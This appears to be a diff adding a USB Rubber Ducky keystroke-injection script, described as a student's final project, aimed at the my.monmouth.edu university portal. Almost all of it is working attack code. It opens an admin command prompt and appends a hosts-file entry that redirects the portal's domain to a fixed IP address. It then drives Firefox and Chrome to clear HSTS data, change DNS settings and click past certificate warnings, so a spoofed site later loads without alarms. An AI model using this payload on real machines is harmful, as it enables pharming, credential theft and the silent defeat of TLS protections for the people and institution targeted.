@@ -1,0 +1,274 @@
+REM TITLE Final project
+REM AUTHOR Anjali Narang
+REM DESCRIPTION combining all payloads for final project
+
+REM *** CHANGE HOSTS FILE ***
+
+DELAY 500
+
+REM run dialog
+GUI r
+DELAY 500
+
+REM admin cmd prompt
+STRING cmd
+DELAY 500
+CTRL-SHIFT-ENTER
+DELAY 1000
+
+REM say yes to open
+ALT y
+DELAY 500
+
+REM go to directory with hosts file
+STRING cd C:\Windows\System32\drivers\etc
+ENTER
+DELAY 500
+
+REM add to hosts file
+STRING echo. >> hosts
+ENTER
+STRING echo 54.90.92.211 my.monmouth.edu >> hosts
+ENTER
+DELAY 200
+
+REM close cmd prompt
+STRING exit
+ENTER
+
+REM to restore:
+REM Windows + R, notepad, ctrl+shift+enter
+REM file -> open -> C:\Windows\System32\drivers\etc
+REM change type to all files to see the hosts file
+REM delete up to the last comment (with the #)
+
+REM *** CONFIGURE FIREFOX ***
+REM right now history is cleared in place of "forget this site"; could not
+REM figure out how to do this with ducky. site must be forgotten to clear
+REM hsts data.
+REM cache clearing may not be necessary anymore since this step was added,
+REM but I left it in just in case.
+REM offline localhost setting should be enabled to use DNS hosts file.
+REM and lastly, we go to the site and pass through the warnings so that 
+REM they do not show next time it is opened. 
+
+DELAY 500
+
+REM run dialog
+GUI r
+DELAY 500
+
+REM wait for Firefox to open
+STRING firefox
+ENTER
+DELAY 500
+
+REM go to settings
+CTRL t
+DELAY 500
+STRING about:preferences
+ENTER
+DELAY 1000
+
+REM search for setting
+STRING cookies and site data
+
+REM focus the button
+DELAY 200
+TAB
+TAB
+TAB
+DELAY 200
+ENTER
+
+REM set to delete all history
+DELAY 200
+DOWN
+DOWN
+DOWN
+DOWN
+DOWN
+
+REM select history
+DELAY 200
+TAB
+
+REM delete
+DELAY 200
+ENTER
+
+DELAY 1000
+
+REM go to settings
+CTRL t
+DELAY 500
+STRING about:config
+ENTER
+DELAY 1000
+
+REM focus and press "accept risk and continue"
+TAB
+TAB
+TAB
+TAB
+TAB
+TAB
+TAB
+TAB
+TAB
+TAB
+DELAY 200
+ENTER
+
+REM go to the setting
+DELAY 500
+STRING network.dns.offline-localhost
+
+REM focus and press the switch button
+DELAY 200
+TAB
+TAB
+DELAY 200
+ENTER
+
+DELAY 1000
+
+REM go to networking dns
+CTRL t
+DELAY 500
+STRING about:networking#dns
+ENTER
+DELAY 1000
+
+REM focus clear cache button and press it
+TAB
+DELAY 200
+ENTER
+DELAY 500
+
+REM open new tab and go to networking http
+CTRL t
+DELAY 500
+STRING about:networking#http
+ENTER
+DELAY 500
+
+REM focus clear cache button and press it
+TAB
+DELAY 200
+ENTER
+
+DELAY 1000
+
+REM go to site
+CTRL t
+DELAY 500
+STRING https://my.monmouth.edu/
+ENTER
+DELAY 1000
+
+REM press "Accept the risk and continue"
+TAB
+TAB
+TAB
+TAB
+TAB
+DELAY 1000
+ENTER
+DELAY 1000
+
+REM close Firefox; all tabs so that they do not show on next Firefox opening
+CTRL w
+CTRL w
+CTRL w
+CTRL w 
+CTRL w
+CTRL w
+CTRL w
+
+DELAY 1000
+
+REM *** CONFIGURE CHROME ***
+REM clearing hsts data is simpler on Chrome; it has a dedicated spot in
+REM settings. 
+REM afterwards, just click through the page like on Firefox to disable
+REM the security warning, so it doesn't show next time. 
+REM unless my Chrome had something done to it before, I do not think
+REM changing a setting is necessary to use the DNS hosts file.
+
+REM run dialog
+GUI r
+DELAY 500
+
+REM wait for Chrome to open
+STRING chrome
+ENTER
+DELAY 500
+
+REM go to hsts settings
+STRING chrome://net-internals/#hsts
+ENTER
+DELAY 1000
+
+REM focus the text box
+TAB
+TAB
+TAB
+TAB
+TAB
+TAB
+TAB
+TAB
+TAB
+TAB
+TAB
+TAB
+TAB
+
+REM type my.monmouth.edu
+DELAY 500
+STRING my.monmouth.edu
+
+REM press "Delete"
+DELAY 200
+TAB
+DELAY 200
+ENTER
+DELAY 200
+
+REM close Chrome
+ALT F4
+
+DELAY 500
+
+REM run dialog
+GUI r
+DELAY 500
+
+REM wait for Chrome to open
+STRING chrome
+ENTER
+DELAY 500
+
+REM go to site
+STRING https://my.monmouth.edu/
+ENTER
+DELAY 500
+
+REM press "Advanced"
+TAB
+TAB
+TAB
+TAB
+DELAY 200
+ENTER
+DELAY 200
+
+REM press "Proceed"
+TAB
+DELAY 200
+ENTER
+DELAY 200
+
+REM close Chrome
+ALT F4
